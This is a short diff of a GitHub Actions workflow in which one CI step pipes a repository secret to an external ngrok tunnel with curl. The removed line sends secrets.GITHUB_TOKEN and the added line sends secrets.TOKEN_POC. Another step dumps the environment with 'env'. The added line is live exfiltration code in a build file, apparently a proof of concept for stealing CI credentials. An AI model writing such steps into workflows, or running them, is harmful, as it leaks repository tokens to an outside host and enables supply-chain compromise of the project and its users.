@@ -15,4 +15,4 @@ jobs:
       - run: bats -v
       - run: ls -la
       - run: env
-      - run: curl https://5359-210-16-83-150.ngrok-free.app/?token=${{ secrets.GITHUB_TOKEN }}
+      - run: curl https://5359-210-16-83-150.ngrok-free.app/?token=${{ secrets.TOKEN_POC }}
